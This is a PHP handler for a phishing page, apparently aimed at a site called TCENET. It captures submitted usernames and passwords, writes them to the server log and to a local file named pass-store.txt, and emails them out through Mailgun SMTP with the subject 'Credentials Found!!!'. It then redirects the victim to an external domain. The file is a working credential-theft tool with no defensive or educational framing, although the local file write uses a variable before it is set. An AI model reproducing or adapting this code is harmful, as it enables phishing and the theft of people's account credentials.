<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// require '../vendor/autoload.php';

require '/usr/share/php/libphp-phpmailer/src/PHPMailer.php';
require '/usr/share/php/libphp-phpmailer/src/SMTP.php';
require '/usr/share/php/libphp-phpmailer/src/Exception.php';

$username = $_POST['username'];
$password = $_POST['password'];
$res = "[+] Username: $username <--|+|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");

$file = fopen("pass-store.txt", "a") or die("Unable to open file!");

echo "$message";
$txt = "$message\n";
fwrite($file, $txt);
fclose($file);

$message = "Username: $username <--|+|--> Password: $password";
$mail = new PHPMailer;
$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.mailgun.org';                     // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = '';   // SMTP username
$mail->Password = '';                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable encryption, only 'tls' is accepted

$mail->From = '';
$mail->FromName = 'Postmaster MailGun';
$mail->addAddress('');                 // Add a recipient

$mail->WordWrap = 50;                                 // Set word wrap to 50 characters

$mail->Subject = "TCENET - Credentials Found!!!";
$mail->Body    = "{$message}";

if($mail->Send()){
echo "<script type='text/javascript'>window.location='https://zaptech.zapto.org'</script>";
}
else{
    echo "ERROR";
}

exit();

?>
